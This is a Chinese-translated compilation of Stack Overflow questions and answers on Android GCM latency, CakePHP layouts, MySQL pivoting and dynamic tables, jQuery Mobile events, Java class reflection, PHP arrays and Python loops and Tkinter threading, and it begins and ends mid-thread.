GCM 用于尽快将消息推送给用户。您可以在消息中指定何时需要发送 - 可能是 gmail 使用 delay_while_idle 标志来节省电池电量。根据我的经验，GCM 非常非常快。如果您在很短的时间内将许多更新推送到同一设备，您应该只会遇到限制。

[https://developer.android.com/google/gcm/adv.html](https://developer.android.com/google/gcm/adv.html)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-12-29T09:57:31.813

这可能是由Google Cloud Messaging 中**不切实际的心跳间隔引起的。**

GCM 的工作原理是维护从 Android 设备到 Google 服务器的空闲套接字连接。这很棒，因为它几乎不消耗电池电量（与轮询相反），并且它允许在消息到达时立即唤醒设备。

为确保连接保持活动状态，Android 将在移动连接上每 28 分钟发送一次心跳，在 WiFi 上每 15 分钟发送一次。如果心跳失败，则连接已终止，GCM 将重新建立它并尝试检索任何未决的推送通知。心跳间隔越高，消耗的电池越少，设备从睡眠中唤醒的次数就越少。

然而，这是有代价的：心跳间隔越长，识别断开的套接字连接所需的时间就越长。在部署 GCM 之前，谷歌没有在现实生活中对这些间隔进行足够彻底的测试。这些间隔的问题是由网络路由器和移动运营商引起的，他们在几分钟不活动后断开空闲套接字连接。

更多信息可在我的博客上找到：

[http://eladnava.com/google-cloud-messaging-extremely-unreliable/](http://eladnava.com/google-cloud-messaging-extremely-unreliable/)

作为一种解决方法，请考虑 Pushy ( [https://pushy.me](https://pushy.me) )，它是 GCM/FCM 的直接替代品，它极大地提高了通知速度和可靠性（完全披露 - 我创立了 Pushy）。

# cakephp - CakePHP 从内部/外部链接呈现不同的布局文件

> ID：14379066
> 
> 赞同：1
> 
> 时间：2013-01-17T12:25:02.310
> 
> 标签：cakephp, view, render, cakephp-2.1

在我的项目中，我在灯箱中显示我的视图，我不希望加载顶部导航。我正在使用：

> $this->render('ajax');

这样，只加载了内容，并且在灯箱内看起来不错。

问题是，当我分享视图链接时。

单击查看链接仅显示没有顶部导航（等）的**查看**页面

***任何想法，我如何才能仅更改视图方法的渲染值？***

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:30:45.733

通常这是请求处理程序发挥作用的地方。

尝试这样的事情：

```
if ($this->request->is('ajax')) {
    $this->layout = 'ajax';
    $this->render('ajax');

} else {
    $this->layout = 'regular_layout';
    $this->render('not_ajax');
} 
```

直接访问时`app/controller/action`，将呈现“非 ajax”视图/布局。

[更多在文档中](http://book.cakephp.org/2.0/en/core-libraries/components/request-handling.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:28:09.240

您可以使用 $this->referer() 来查看用户是来自您的站点还是另一个站点，如果他们来自另一个站点（外部）然后呈现不同的视图或只是将用户重定向到另一个页面..您可以对会话做同样的事情而不是裁判地址，检查用户是否有一个会话（你必须事先设置）......

# mysql - 将数据行转换为类似于数据透视表但具有实际值的表

> ID：14379067
> 
> 赞同：1
> 
> 时间：2013-01-17T12:25:12.903
> 
> 标签：mysql, excel, pivot-table

我在 mysql 表中有数据，格式为

```
C1 | C2 | C3 (Column titles)  
A1 | X1 | Y1  
A1 | X2 | Y2  
A1 | X3 | Y3  
B1 | X1 | Y4  
B1 | X2 | Y5  
B1 | X3 | Y6  
B1 | X4 | Y7  
C1 | X1 | Y8  
C1 | X2 | Y9 
```

我想将其转换为

```
00 | X1 | X2 | X3 | X4  
A1 | Y1 | Y2 | Y3 |   
B1 | Y4 | Y5 | Y6 | Y7  
C1 | Y8 | Y9 
```

很像数据透视表，但将 Yx 的实际值放在表中，而不是对它们执行操作（Sum / Avg 等）。

有没有简单的方法在 mysql 或 excel/libreoffice 中做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T12:32:59.070

[SQLFiddle 演示](http://www.sqlfiddle.com/#!2/a59b98/4)

```
select 
C1,
max(case when c2='X1' then C3 else '' end) as `X1`,
max(case when c2='X2' then C3 else '' end) as `X2`,
max(case when c2='X3' then C3 else '' end) as `X3`,
max(case when c2='X4' then C3 else '' end) as `X4`

from t
group by C1 
```

# c# - 在 Silverlight 中读取和写入所有 JPEG 元数据

> ID：14379078
> 
> 赞同：1
> 
> 时间：2013-01-17T12:25:47.467
> 
> 标签：c#, image, silverlight, metadata, exif

我开发了一个 Silverlight 应用程序，它需要在客户端压缩 JPEG 图像。我一直在使用一个名为[FJCore](https://code.google.com/p/fjcore/)的库来实现这个目标。

然而，我遇到的最大问题之一是，此工具包要求您首先将 JPEG 转换为 WriteableBitmap，从而剥离与 JPEG 相关的所有元数据，例如 EXIF、XMP、JFIF 等。我已经修改了 FJCore 库的源以持久化 EXIF，压缩图像，然后重新附加 EXIF 数据。此过程有效，但会丢失其他类型的元数据信息。

我不必实现保存和写入 JPEG 格式存在的每种不同类型的元数据的函数，而是寻找一种简化的方法，允许我提取所有元数据，无论类型或格式如何，使用 FJCore 工具包压缩/调整该图像的大小，然后重新附加所有以前保存的元数据。一些可以帮助我实现目标的方向或示例代码将不胜感激。请记住，这是一个 Silverlight 应用程序，因此我必须使用这些 .NET 库。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-06-21T23:52:16.663

您可以使用 FJCore 又名 ImageTools 来做到这一点。您需要做的就是在第 212 行添加：

```
// Exif.  Do something?
headers.Add(header); 
```

[https://github.com/briandonahue/FluxJpeg.Core/blob/master/FJCore/Decoder/JpegDecoder.cs](https://github.com/briandonahue/FluxJpeg.Core/blob/master/FJCore/Decoder/JpegDecoder.cs)

并确保在调整大小时复制这些标题：

```
jpegOut = new DecodedJpeg(
    new ImageResizer(jpegIn.Image)
        .Resize(320, ResamplingFilters.NearestNeighbor),
    jpegIn.MetaHeaders); // Retain EXIF details 
```

重新编译，你应该很高兴。

# javascript - JQuery $(document).ready(function () 不工作

> ID：14379082
> 
> 赞同：1
> 
> 时间：2013-01-17T12:26:10.603
> 
> 标签：javascript, jquery, html, jquery-mobile

这是我尝试打开 detail.html 的第一页；

```
<a href="detail.html" data-role="none" role="link">
    <div class="place">name</div>
    <div class="arrow"></div>
    <div class="ammount">-&euro;4,<span class="fontsize14">25</span></div>
</a> 
```

我在 detail.html 上加载脚本时遇到问题（在第一页上单击 href 链接后）

这是我在 details.html 标题中的脚本（我在第一页上单击 href 之后的页面），问题是我无法**获得**控制台测试打印，加载 details.html 页面时不会调用该函数。只有在我手动刷新页面后才会出现

```
<script>
    $(document).bind("pageinit", function(){//or $(document).ready(function ()   
          console.log('test');
    });
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T15:20:10.240

要了解您的问题，我认为您需要首先了解 jQuery Mobile 如何“加载”外部页面。默认情况下，当您单击指向单独 HTML 页面的链接时，JQM 会加载该页面上的第一个*data-role="page"*并将其附加到第一页的 DOM，事情是 JQM**仅**加载该*页面*div 而不是任何脚本等在该容器之外。

如果要为第二页运行代码，则需要在第一页中包含该脚本并使用事件委托（因为第二页还不是 DOM 的一部分），或者在第二页的*日期角色中包含该脚本="page"*包装。

在您的情况下，如果您想为您的详细信息页面运行代码，您需要在第一页上包含脚本，例如假设您的 detail.html 页面上有一个 div，如下所示

```
<div id="details" data-role="page"> ..rest of your content 
</div> 
```

然后在您的第一页上，您可以执行以下操作

```
$(document).on('pageinit', '#details', function() {
  console.log('test');
}); 
```

或者，您可以在“详细信息”页面包装器中包含一个脚本标记。

编辑：
正如我所提到的，这是默认行为，但是如果您希望可以[告诉 jQuery Mobile](http://jquerymobile.com/demos/1.2.0/docs/pages/page-links.html)`data-ajax="false"`在加载第二页时通过添加或添加`rel="external"`到您的链接来做一个完整的帖子

```
<a href="detail.html" data-ajax="false" data-role="none" role="link">
    <div class="place">name</div>
    <div class="arrow"></div>
    <div class="ammount">-&euro;4,<span class="fontsize14">25</span></div>
</a> 
```

和之间的区别在于`data-rel="external"`，`data-ajax="false"`如果第二页基本上是语义的，`data-rel="external"`那么如果第二页位于不同的域中，则应该使用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T14:56:52.610

我给你做了一个工作的例子：http: [//jsfiddle.net/Gajotres/Eqzd2/](http://jsfiddle.net/Gajotres/Eqzd2/)

```
$("#second").live('pagebeforeshow', function () {
    console.log('This will only execute on second page!');
}); 
```

如果您使用的是最新版本的 jQuery，您可以使用 on 而不是 live。

还可以看看我关于 jQM 页面转换中的事件流的文章：[https ://stackoverflow.com/a/14010308/1848600](https://stackoverflow.com/a/14010308/1848600)

# java - 用拇指保存图像并在 imageView android 上显示

> ID：14379084
> 
> 赞同：3
> 
> 时间：2013-01-17T12:26:13.460
> 
> 标签：java, android, eclipse

我正在尝试保存从相机拍摄的图像，然后将其连同其拇指一起存储在 sdCard 上，该拇指也在 imageView 上显示。但是它在 Null 指针处给出错误

```
 imageBitmap = Bitmap.createScaledBitmap(imageBitmap, 40, 40, false); 
```

怎么了？

```
 {
            Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
            try 
            {
              if (title.getText().toString().equals(""))
              {
                displayAlert("Please Input Title First","Error!");
              }
              else
              {

                Integer val = myMisc.miscId ;
                String fileName = "image" + "_" + title.getText().toString()+"_" + val.toString();
                photo = this.createFile(fileName, ".jpg");
                myMisc.filename = photo.getAbsolutePath();
                intent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(photo));
                startActivityForResult(intent, RESULT_CAMERA_SELECT);
              }
            }
            catch(Exception e)
            {
                Log.v("Error", "Can't create file to take picture!");
                displayAlert("Can't create file to take picture!","SDCard Error!");
            }
        }

public synchronized void onActivityResult(final int requestCode, int resultCode, final Intent data) 
    {
       if (resultCode == Activity.RESULT_OK) 
       {
           if (requestCode == RESULT_CAMERA_SELECT)
           {
               try 
               {
                   saveImage();
               }
               catch (IOException e) 
               {
                   e.printStackTrace();
               }
           }

public static int calculateInSampleSize(
            BitmapFactory.Options options, int reqWidth, int reqHeight) {
    // Raw height and width of image
    final int height = options.outHeight;
    final int width = options.outWidth;
    int inSampleSize = 1;

    if (height > reqHeight || width > reqWidth) {
        if (width > height) {
            inSampleSize = Math.round((float)height / (float)reqHeight);
        } else {
            inSampleSize = Math.round((float)width / (float)reqWidth);
        }
    }
    return inSampleSize;
}

    public void saveImage() throws IOException
    {
      try 
        {       
           FileInputStream is2 = new FileInputStream(photo);
           final BitmapFactory.Options options = new BitmapFactory.Options();
           options.inJustDecodeBounds = true;
           Bitmap imageBitmap = BitmapFactory.decodeStream(is2, null, options);
           options.inSampleSize = calculateInSampleSize(options, 40, 40);
           options.inJustDecodeBounds = false;
           imageBitmap = BitmapFactory.decodeStream(is2 ,null, options);
           imageBitmap = Bitmap.createScaledBitmap(imageBitmap, 40, 40, false);
           Integer val = myMisc.miscId;
           String fileName = ".thumbImage" + "_" + title.getText().toString()+ "_" + val.toString();  
           photo = this.createFile(fileName, ".jpg");
           myMisc.thumbFileName = photo.getAbsolutePath();
        try {
           FileOutputStream out = new FileOutputStream(photo);
           imageBitmap.compress(Bitmap.CompressFormat.PNG, 90, out);
            } catch (Exception e) {
           e.printStackTrace();
            }
            is2.close();
            Uri uri = Uri.fromFile(photo);
            photo = null;
            imageBitmap = null;
            imageView.setImageURI(uri);
        }catch(Exception e)
        {
            displayAlert("Can't create file to take picture!","SD Card Error");
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-09T03:57:32.730

我发现我的错误`Bitmap imageBitmap = BitmapFactory.decodeStream(is2, null, options);`解码两次

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-01T22:11:29.580

这可能是因为 decodeStream 方法。

`Bitmap imageBitmap = BitmapFactory.decodeStream(is2, null, options);`

您在请求 Rectangle 时解析了 null 并且当您尝试创建缩放位图时它无效。

# mysql - mysql动态创建表

> ID：14379088
> 
> 赞同：4
> 
> 时间：2013-01-17T12:26:16.940
> 
> 标签：mysql

我正在mysql上创建一个数据库。首先创建主表，每个表平均有 30 列。而log表的标准是被引用表的pk加上每列*2。像这样：

**参考表：**

```
Field   |   Type      |   Null   |   Key   |   Default   |   Extra
--------+-------------+----------+---------+-------------+----------------
TableID | int(11)     | No       | PRI     | Null        | auto_increment
Col1    | varchar(50) | No       |         | Null        | 
```

**日志表：**

```
Field       |   Type      |   Null   |   Key   |   Default   |   Extra
------------+-------------+----------+---------+-------------+----------------
LogTableID  | int(11)     | No       | PRI     | Null        | auto_increment
TableID     | int(11)     | No       | MUL     | Null        |
NewCol1     | varchar(50) | No       |         | Null        |
UpdatedCol1 | varchar(50) | No       |         | Null        | 
```

现在我想要创建一个过程，在该过程上我将表名作为参数传递并生成表日志查询的创建并执行它。

做这个的最好方式是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-17T14:15:21.420

要使字符串表示表（或数据库）名称，您需要将查询字符串与变量连接起来，并在存储过程中准备/执行语句。这是一个基本的例子。

```
-- DROP PROCEDURE IF EXISTS createLogTable;
DELIMITER //
CREATE PROCEDURE createLogTable(tblName VARCHAR(255))
BEGIN
    SET @tableName = tblName;
    SET @q = CONCAT('
        CREATE TABLE IF NOT EXISTS `' , @tableName, '` (
            `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
            `something` VARCHAR(10) NOT NULL,
            `somedate` DATETIME NOT NULL,
            PRIMARY KEY (`id`)
        ) ENGINE=MyISAM DEFAULT CHARSET=utf8
    ');
    PREPARE stmt FROM @q;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
    -- and you're done. Table is created.
    -- process it here if you like (INSERT etc)
END // 
```

然后…`CALL createLogTable('exampleTable');`

所以基本思想是

1.  根据需要将过程参数与您的查询连接起来
2.  从此查询字符串准备/执行语句

# iphone - 跳转到 UINavigationController 中的特定点

> ID：14379089
> 
> 赞同：0
> 
> 时间：2013-01-17T12:26:19.513
> 
> 标签：iphone, ios, objective-c, xcode, uinavigationcontroller

我正在使用我正在开发的应用程序遇到了一些难题，我只是不知道如何跳转到导航控制器堆栈中的特定视图控制器。

因此，概述应用程序的结构。我正在使用 Storyboards 和 Segues 在视图之间导航。

**主屏幕**- 这会从服务器中提取 4 个最新作业更新的列表并将它们显示在表格中，并有一个按钮以模态方式显示 UINavigationController。

**UINavigationController**

**作业列表**- 从服务器中提取所有当前作业的列表并将它们显示在表格中。在选择一个单元格时，`jobid`在 Job details during 中设置`prepareForSegue:`，然后将其推入堆栈。

**作业详细信息**- 提取作业的所有详细信息（描述、照片等）并显示它们。

因此，通过主屏幕按钮 > 作业列表 > 作业详细信息导航作业不是问题，并且可以完美运行。

我想不通的是如何在主屏幕上选择最新的工作更新之一时跳转到特定工作的详细信息。

我希望我已经解释得够多了。任何帮助将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:10:55.247

在 JobListViewController 中创建几个属性：

```
@property (assign) int initialisedWithSelectedJob;
@property (assign) int selectedJob; 
```

当您从主屏幕模态显示时，如果选择了一个作业，则将其传递给 JobListViewController 中的 initialisedWithSelectedJob：

```
- (void) prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender  {

   [(JobListViewController*)[segue.destinationViewController topViewController] 
                                     setInitialisedWithSelectedJob:selectedJob];

} 
```

然后在您的 JobListViewController 的 viewDidLoad 中：

```
if (self.initialisedWithSelectedJob)
    {   
        self.selectedJob = initialisedWithSelectedJob;
        [self performSegueWithIdentifier:@"onToJobDetails" sender:self];
        self.initialisedWithSelectedJob == 0;
    } 
```

您必须重置 initialisedWithSelectedJob 以便您可以从 JobDetails 屏幕返回此处而不会再次被直接弹回。）。

在 JobListViewController 的 prepareForSegue 中，您可以像以前一样传递 selectedJob id。

*更新*

这样，您将从 Job Detail 返回到 JobListViewController。无论您在主屏幕或列表屏幕上选择作业，从主屏幕 -> 作业列表屏幕 -> 作业详细屏幕的移动都将保持一致。

如果您按照`0x7fffffff`的回答，那么无论您是从主屏幕还是作业列表屏幕中选择作业，导航都会大不相同。

我想知道你是否应该重新考虑一下你的设计——在主屏幕和 JobListViewController 中都有你的工作列表可能有点多余？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:53:27.677

在界面生成器中，您可以为要推送到的视图控制器分配一个 ID：

![在此处输入图像描述](../Images/ddb55e8367273dce2e92d6a6dd5f48d2.png)

然后，当用户选择“最新作业”时，您可以使用以下内容推送到具有该标识符的视图控制器。

```
UIViewController *detailController = [[self storyboard] instantiateViewControllerWithIdentifier:@"myID"];
[[self navigationController] pushViewController:detailController animated:YES]; 
```

当然，为了做到这一点，您还必须将主视图控制器嵌入到导航控制器中。

# java - 如何在不使用类名的情况下以静态方法获取 Class 对象？

> ID：14379092
> 
> 赞同：4
> 
> 时间：2013-01-17T12:26:30.243
> 
> 标签：java, class, inheritance, reflection, static

我有

```
public class A {
    static X s_x = new X(A.class);
} 
```

和

```
public class B {
    static X s_x = new X(B.class);
} 
```

等等对于许多没有任何特殊关系或共性的类。我真正希望我能做的是在超类中初始化 s_x，但使用子类特定的代码；这是不可能的，因为静态代码不可覆盖。所以，我想至少让我的复制粘贴更容易。我想要一个计算为 Class 对象的魔术表达式，即写：

```
 static X s_x = new X(/* magic expression here */); 
```

无论我在其中声明 X 的类如何，魔术表达式都是相同的，但与上面的示例相同。次优选择是达到相同效果的静态方法。

笔记：

*   如果可能的话，Java 6。
*   这个问题（不一定）与日志记录有关......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:56:19.940

在 HotSpot/OpenJDK 你可以使用

```
 Class c = Reflection.getCallerClass(1) 
```

注意：这是一个内部 API，可能不适用于所有 JVM。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T19:45:31.410

这是一个应该在 Java 5+ JVM 中工作并且不会向您的代码添加任何额外导入的单行代码：

```
new Object(){}.getClass().getEnclosingClass() 
```

它创建一个匿名内部类，获取它的`Class`对象，然后获取它的封闭类实例，它应该是你的类。例如：

```
public class HelloClass {
    static final Class<?> THIS_CLASS = new Object(){}.getClass().getEnclosingClass();

    public static void main(String[] args) {
        System.out.println(THIS_CLASS); // prints "class HelloClass"
    }
} 
```

在你的问题的背景下：

```
static X s_x = new X(new Object(){}.getClass().getEnclosingClass()); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-17T12:39:17.733

我曾经也有这个奇怪的要求，我试图搜索但没有找到任何东西，所以我想答案是不可能的。

但是我被告知要重新考虑我的方法，当我尝试时，我想出了相同的解决方案，而没有这个奇怪的要求。所以请重新考虑你的方法。我相信你能像我一样解决它。另外，如果您可以发布您要解决的问题/场景，也许我可以提供帮助。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-17T12:42:52.740

在 Java 7 中，您可以使用该类`java.lang.invoke.MethodHandles`：

```
Class c = MethodHandle.lookup().lookupClass() 
```

您可能会收到有关使用原始类型而不是参数化版本的警告，`Class<X>`但我看不出如何避免这种情况，而无需自己恢复对类名进行硬编码。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-17T12:56:20.650

您可以这样做，但需要对您的方法进行一些重新考虑：

# 试试这个：

```
class X
{

   public X(String cName)
   {
     try
     {
       Class.forName(cName);
      }catch(ClassNotFoundException cne)
       {}
   }
}

public class Test
{
    static X x1 = new X(Thread.currentThread().getStackTrace()[1].getClassName());
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-01-17T13:22:43.710

如果你想创建一个日志对象，你可以使用[lombok](http://projectlombok.org/features/Log.html)为你注入一个日志对象。页面示例：

```
@Log
public class LogExample {

  public static void main(String... args) {
    log.error("Something's wrong here");
  }
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-01-17T13:31:58.550

这里的一些答案有解决方案的想法，但不是我需要的代码片段。所以在这里，在任何 JVM 上工作：

```
static X s_x = new X(getClassStatic());

public static Class<?> getClassStatic() {
    try {
        // we're using the third highest stack element, since the
        // first highest is the getStackTrace() method, followed by this method itself. We
        // want the calling code's class.
        String name = Thread.currentThread().getStackTrace()[2].getClassName();
        return Class.forName(name);
    } catch (ClassNotFoundException e) {
        // shouldn't be able to get here...
        return null;
    }
} 
```

或者，对于选定的 JVM，按照 Peter Lawrey 的建议：

```
static X s_x = new X(getCallerClass(1)); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-01-17T12:41:00.660

我认为唯一的解决方案是从当前的堆栈跟踪中提取类名（请参阅 参考资料[`Thread.getStackTrace()`](http://docs.oracle.com/javase/7/docs/api/java/lang/Thread.html#getStackTrace%28%29)），这会将它作为 a 提供给您`String`，您可以从中获取`Class`对象 using `Class.forName(String)`，但这比您当前的方法要丑陋得多。

# mysql - SQL 查询返回表中没有的内容

> ID：14379096
> 
> 赞同：1
> 
> 时间：2013-01-17T12:26:34.290
> 
> 标签：mysql, sql

> **可能重复： SQL：在**[获取 mysql 表中不存在的值](https://stackoverflow.com/questions/14114980/getting-values-which-dont-exist-in-mysql-table)
> [的表中查找缺少的 ID](https://stackoverflow.com/questions/1389605/sql-find-missing-ids-in-a-table)

只是想知道，是否有可能有一个查询以某种方式告诉您它在表中没有找到的值？

所以如果我有一个查询`SELECT * FROM mytable WHERE id IN (1,2,3,4,5,6,7,8,9)`并且只返回 2,3,6,7,9。我想知道没有找到1,4,5,8。

进行手动比较会有点困难，因为这将在一个表中超过 2,000 行以上运行*（id 将通过一个 csv 文件提供，该文件可以复制到查询中）*

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:29:28.740

This is probably silly, but what about creating a [temporary table](http://www.sqlteam.com/article/temporary-tables) containing all your IDs from which you'll substract the result of your SELECT query ?

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:35:21.023

未经测试，但在理论上：

```
Table 1:
+----+-----+
| id | num |
+----+-----+

Table 2:
+----+
| id |
+----+ 
```

表 1 包含您要查找的数据（并且`num`是包含任何数据的任何字段） 表 2 包含来自 CSV 的 ID

```
SQL:
SELECT COUNT(`Table1`.`num`) AS `count`
FROM `Table1`
LEFT JOIN `Table2` ON `Table1`.`id` = `Table2`.`id`
WHERE `count` = 0 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T12:56:07.177

关于什么：

`SELECT *`
   `FROM (select 1 as f`
               `UNION`
               `SELECT 2 as f`
               `UNION`
               `SELECT 3 as f`
               `UNION`
               `SELECT 4 as f`
               `UNION`
               `SELECT 5 as f`
               `UNION`
               `SELECT 6 as f`
               `UNION`
               `SELECT 7 as f`
               `UNION`
               `SELECT 8 as f`
               `UNION`
               `SELECT 9 ) as s1`
 `WHERE f NOT IN (SELECT id FROM mytable);`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-17T12:44:53.457

快速解决方案，打开您的 csv 文件，将所有逗号替换为“union select”，将 select 放在该行的前面，并将其用作底部查询中查询的第一行。

所以 1,2,3 变成

选择 1 联合 选择 2 联合 选择 3

在下面的查询中使用它

```
 Select 1 union select 2 union select x -- replace this line with the line generated from your csv
    Except
    (
     Select id from mytable
    ) 
```

# php - 如何在将数组添加到一组数组之前命名数组 PHP

> ID：14379101
> 
> 赞同：-1
> 
> 时间：2013-01-17T12:26:51.393
> 
> 标签：php, arrays

有没有办法在将数组添加到一组数组之前命名数组？我有下面的代码，它从目录中获取文件列表，然后获取列出的文件的内容并将它们添加到数组中。

```
public function buildArray(){

$handsetFilenames = array();
$handsetArray     = array();

    if ($handle = opendir('path to file/')) {
        while (false !== ($entry = readdir($handle))) {
            $handsetFilenames[] = $entry;
        }
    }

        foreach ($handsetFilenames as $match => $key){
            $file = file('handsets/'.$key);
            $handsetArray[] = $file;    
        }
    return $handsetArray;
} 
```

当我输出时，`$hansetArray`我得到一个列表，只是说 Array 23 次。当我在数组中输出数组时，它们工作正常，但我希望它们以它们取自的文件命名，即来自`$handsetFilenames`.

编辑：显然我没有表明我已经尝试自己解决这个问题！

我试图添加它`$handsetArray[$key] = $file;`以使其成为关联数组，但这仍然不起作用。

我的输出方法是这样的：

```
$file_location = $fileLocation->buildArray();

foreach ($file_location as $match => $key){
    $page->addToBody($match.' = '.$key."</br>");    
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:28:22.257

请执行下列操作：

```
 foreach ($handsetFilenames as $match => $key){
        $file = file('handsets/'.$key);
        $handsetArray[$key] = $file; // added $key. Or add $match
    } 
```

# python - python中的双重for循环

> ID：14379103
> 
> 赞同：8
> 
> 时间：2013-01-17T12:27:00.650
> 
> 标签：python

我正在尝试按顺序获取文件名列表。就像是

```
files-1-loop-21
files-1-loop-22
files-1-loop-23
files-1-loop-24
files-2-loop-21
files-2-loop-22
files-2-loop-23
.
.
.
and so on 
```

至于测试，我编写了如下python代码：

代码示例_1：

```
for md in range(1,5):
   for pico in range(21,25):
      print md, pico 
```

它给了我一对数字，例如：

```
 `1 21
   1 22
   1 23
   1 24
   2 21
   2 22
   2 23
   2 24
   3 21
   3 22
   3 23
   3 24
   4 21
   4 22
   4 23
   4 24 
```

`

如果我使用：

代码示例_2：

```
 for md in range(1,5):
   for pico in range(21,25):
  print "file-md-loop-pico" 
```

我明白了

```
 files-md-loop-pico
  files-md-loop-pico
  files-md-loop-pico
  files-md-loop-pico
  files-md-loop-pico
  files-md-loop-pico
  files-md-loop-pico 
```

应该如何更改（代码示例_2）以在 python 中获得我想要的文件列表（如本文开头所示）？

提前致谢。

问候

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-01-17T12:29:33.423

Try this:

```
for md in range(1,5):
   for pico in range(21,25):
      print "file-{0}-loop-{1}".format(md, pico) 
```

Or:

```
from itertools import product
for md, pico in product(range(1,5), range(21,25)):
    print "file-{0}-loop-{1}".format(md, pico) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T12:29:18.777

Use string formatting.

```
print 'file-{0}-loop-{1}'.format(md, pico) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-12-04T06:13:01.920

单线：

```
print '\n'.join([('files-%d-loop_%d' %(i, j)) for i in xrange(1,5) for j in xrange(21,25)]) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-17T12:32:32.607

1) Python 范围由[indentation](http://docs.python.org/release/2.5.1/ref/indentation.html)确定。您的内部代码必须正确缩进：

```
for md in range(1,5):
    for pico in range(21,25):
        print "file-md-loop-pico" 
```

2）您使用的是字符串文字`"file-md-loop-pico"`，而不是插入变量`md`和`pico`. 要[正确格式化您的字符串](https://stackoverflow.com/questions/5082452/python-string-formatting-vs-format)，请使用：

```
for md in range(1,5):
    for pico in range(21,25):
        print "file-{0}-loop-{1}".format(md, pico) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-01-17T12:40:52.917

其他答案中提供的解决方案，用 {} 包围的参数是正确的现代方法

```
print'file-{0}-loop-{1}'.format{md,poco) 
```

您可能会看到一种较旧的方法，如果您熟悉 c 或 c++ sprintf，这可能更有意义

```
print'file-%d-loop-%d'%(md,poco) 
```

文档：[http ://docs.python.org/2/tutorial/inputoutput.html](http://docs.python.org/2/tutorial/inputoutput.html)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-11-19T11:04:05.530

这将很容易解决问题：

代码：

```
for md in range(1,5):
       for pico in range(21,25):

            print "file-%d-loop-%d"%(md,pico) 
```

输出：

```
file-1-loop-21
file-1-loop-22
file-1-loop-23
file-1-loop-24
file-2-loop-21
file-2-loop-22
file-2-loop-23
file-2-loop-24
file-3-loop-21
file-3-loop-22
file-3-loop-23
file-3-loop-24
file-4-loop-21
file-4-loop-22
file-4-loop-23
file-4-loop-24 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-12-22T06:24:23.317

```
for md in range(1,5,1):
  for pico in range(21,25,1):
     print ("file-" + str(md) +"-loop-" + str(pico) ) 
```

# python - 使用 Tkinter 的多线程 python

> ID：14379106
> 
> 赞同：5
> 
> 时间：2013-01-17T12:27:05.900
> 
> 标签：python, multithreading, tkinter

我正在使用这些功能在画布上绘制小圆圈：

这是绘制圆圈的函数：

```
class Fourmis:

def __init__(self, can, posx, posy, name, radius):
    self.can = can

    self.largeur_can = int(self.can.cget("width"))
    self.hauteur_can = int(self.can.cget("height"))

    self.posx = posx
    self.posy = posy
    self.name = name 
    self.radius = radius

    self.ball1 = self.can.create_oval(self.posy, self.posx, self.posy+radius, self.posx+radius, outline=self.name, fill=self.name, width=2)

    self.nx = randrange(-10,10,1)
    self.nx /= 2.0
    self.ny = randrange(-10,10,1)
    self.ny /= 2.0

    #self.can.bind("<Motion>", self.destruction, add="+") 
    self.statut = True

    self.move()

def move(self):
    if self.statut == True :
        self.pos_ball = self.can.coords(self.ball1)
        self.posx_ball = self.pos_ball[0]
        self.posy_ball = self.pos_ball[1]

        if self.posx_ball < 0 or (self.posx_ball + self.radius) > self.largeur_can:
            self.nx = -self.nx         
        if self.posy_ball < 0 or (self.posy_ball + self.radius) > self.hauteur_can:
            self.ny = -self.ny

        self.can.move(self.ball1, self.nx, self.ny)

        self.can.after(10, self.move) 
```

这个创建了画布和圆圈：

```
class App(Frame):

def __init__(self):
    self.root=Tk()
    self.can=Canvas(self.root,width=800,height=600,bg="black")
    self.can.pack()

    self.create(50, "green")
    self.create(50, "purple")

def mainloop(self):
    self.root.mainloop()

def create(self, i, name):
    for x in range(i):
        self.x=Fourmis(self.can,100,400, name,0) 
```

我调用这些行来运行项目：

```
jeu = App()
jeu.mainloop() 
```

在不同线程中执行`self.create(50, "green")`的正确方法是什么？`self.create(50, "purple")`

我尝试了以下方法，但无法正常工作：

```
class FuncThread(threading.Thread):
def __init__(self, i, name):
    self.i = i
    self.name = name
    threading.Thread.__init__(self)

def run(self):
    App.create(self, self.i, self.name) 
```

有人能告诉我如何运行这些线程吗？

* * *

## 回答 #1

> 赞同：10
> 
